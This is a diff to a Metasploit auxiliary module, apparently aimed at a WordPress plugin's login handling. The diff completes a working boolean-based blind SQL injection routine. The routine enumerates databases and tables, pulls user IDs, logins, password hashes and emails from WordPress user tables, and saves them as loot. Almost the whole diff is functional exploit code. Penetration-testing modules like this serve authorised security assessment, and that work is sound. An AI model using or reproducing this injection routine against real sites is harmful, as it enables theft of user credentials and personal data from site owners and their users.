@@ -28,7 +28,7 @@ class MetasploitModule < Msf::Auxiliary
 
     Price: 6
 
-    Video: none
+    Video: https://asciinema.org/a/jREcISyvjc3boVmlThtgelw0L
 
     OS: Multi
 
@@ -72,68 +72,160 @@ class MetasploitModule < Msf::Auxiliary
     end
 
     true_res = /You have exceeded maximum login retries/
-    false_res = /Incorrect Username or Password/
+
+    dbs = []
+    users = []
 
     db_count = ''
+    tmp = nil
     j = 1
-    while true
+    while tmp != ''
       tmp = ''
-      48.upto(57) do |i|
-        get_db_count = "' AND ORD(MID((SELECT IFNULL(CAST(COUNT(DISTINCT(schema_name)) AS CHAR),0x20) FROM INFORMATION_SCHEMA.SCHEMATA),#{j},1))=#{i}-- qKWR"
+      122.downto(36) do |i|
+        get_db_count = "' AND ORD(MID((SELECT IFNULL(CAST(COUNT(DISTINCT(schema_name)) AS CHAR),0x20) FROM INFORMATION_SCHEMA.SCHEMATA),#{j},1))=#{i}-- ITqe"
         res = make_injected_request(get_db_count)
-
         if res.body =~ true_res
-          tmp = i.ord
+          tmp = i.chr
+          db_count << tmp
+          break
         end
       end
-      if tmp == ''
-        break
-      end
       j = j + 1
-      db_count << tmp
     end
 
     db_count = db_count.to_i
 
-    vprint_good("There are #{db_count} databases.")
-
-    dbs = []
-    0.upto(db_count-1) do |i|
-
-      table_name_length = ''
-      k = 1
-      while true
+    0.upto(db_count-1) do |db|
+      tmp = nil
+      j = 1
+      db_name = ''
+      while tmp != ''
         tmp = ''
-        32.upto(126) do |j|
-          get_table_name_length = "' AND ORD(MID((SELECT DISTINCT(IFNULL(CAST(schema_name AS CHAR),0x20)) FROM INFORMATION_SCHEMA.SCHEMATA LIMIT #{i},1),#{k},1))=#{j}-- FGxf"
-          res = make_injected_request(get_table_name_length)
+        122.downto(36) do |i|
+          get_db_name = "' AND ORD(MID((SELECT DISTINCT(IFNULL(CAST(schema_name AS CHAR),0x20)) FROM INFORMATION_SCHEMA.SCHEMATA LIMIT #{db},1),#{j},1))=#{i}-- futo"
+          res = make_injected_request(get_db_name)
 
           if res.body =~ true_res
-            tmp = i.ord
+            tmp = i.chr
+            db_name << tmp
+            break
           end
         end
-        if tmp == ''
-          break
-        end
-        k = k + 1
+        j = j + 1
       end
 
-      table_name_length = table_name_length.to_i
+      dbs << db_name
+    end
 
-      table_name = ''
-      tmp = ''
-      0.up(table_name_length-1) do |j|
-        get_table_name = "' AND ORD(MID((SELECT DISTINCT(IFNULL(CAST(schema_name AS CHAR),0x20)) FROM INFORMATION_SCHEMA.SCHEMATA LIMIT #{i},1),1,1))>64-- FGxf"
+    dbs.delete('information_schema')
+    dbs.delete('performance_schema')
+    dbs.delete('sys')
+    dbs.delete('mysql')
+
+    dbs.each do |db|
+      table_count = ''
+      tmp = nil
+      j = 1
+      while tmp != ''
+        tmp = ''
+        122.downto(36) do |i|
+          get_table_count = "' AND ORD(MID((SELECT IFNULL(CAST(COUNT(table_name) AS CHAR),0x20) FROM INFORMATION_SCHEMA.TABLES WHERE table_schema=0x#{db.unpack("H*")[0]}),#{j},1))=#{i}-- XDIt"
+          res = make_injected_request(get_table_count)
+
+          if res.body =~ true_res
+            tmp = i.chr
+            table_count << tmp
+            break
+          end
+        end
+
+        j = j + 1
+      end
+
+      table_count = table_count.to_i
+
+      tables = []
+      0.upto(table_count-1) do |t|
+        tmp = nil
+        j = 1
+        table_name = ''
+        while tmp != ''
+          tmp = ''
+          122.downto(36) do |i|
+            get_table_name = "' AND ORD(MID((SELECT IFNULL(CAST(table_name AS CHAR),0x20) FROM INFORMATION_SCHEMA.TABLES WHERE table_schema=0x#{db.unpack("H*")[0]} LIMIT #{t},1),#{j},1))=#{i}-- YomN"
+            res = make_injected_request(get_table_name)
+
+            if res.body =~ true_res
+              tmp = i.chr
+              table_name << tmp
+              break
+            end
+          end
+          j = j + 1
+        end
+        vprint_good("Found #{table_name}")
+        tables << table_name
+      end
+
+      tables.each do |table|
+        next if table !~ /_users$/
+
+        user_count = ''
+        tmp = nil
+        j = 1
+        while tmp != ''
+          tmp = ''
+          122.downto(36) do |i|
+            get_user_count = "' AND ORD(MID((SELECT IFNULL(CAST(COUNT(*) AS CHAR),0x20) FROM #{db}.#{table}),#{j},1))=#{i}-- Gsqf"
+            res = make_injected_request(get_user_count)
+
+            if res.body =~ true_res
+              tmp = i.chr
+              user_count << tmp
+              break
+            end
+          end
+          j = j + 1
+        end
+
+        vprint_good("Found #{user_count} users")
+        user_count = user_count.to_i
+
+        0.upto(user_count - 1) do |u|
+
+          user = {}
+          cols = ["ID", "user_login", "user_pass", "user_email"]
+
+          cols.each do |col|
+            tmp = nil
+            j = 1
+            col_val = ''
+            while tmp != ''
+              tmp = ''
+              122.downto(36) do |i|
+                get_col_val = "' AND ORD(MID((SELECT IFNULL(CAST(#{col} AS CHAR),0x20) FROM #{db}.#{table} ORDER BY ID LIMIT #{u},1),#{j},1))=#{i}-- FEDh"
+                res = make_injected_request(get_col_val)
+
+                if res.body =~ true_res
+                  tmp = i.chr
+                  col_val << tmp
+                  break
+                end
+              end
+              j = j + 1
+            end
+            vprint_good( col+":"+col_val)
+
+            user[col] = col_val
+          end
+
+          users << user
+        end
       end
     end
-  end
 
-  def get_val(row,col,len)
-
-  end
-
-  def get_val_length(row,col)
-
+    p = store_loot('wordpress.users', "application/javascript", datastore['RHOST'], users.to_json, "#{datastore['RHOST']}_wordpress_users.txt", "Wordpress Users", 'User details for Wordpress')
+    print_good("Users stored in file: #{p}")
   end
 
   def make_injected_request(sql)
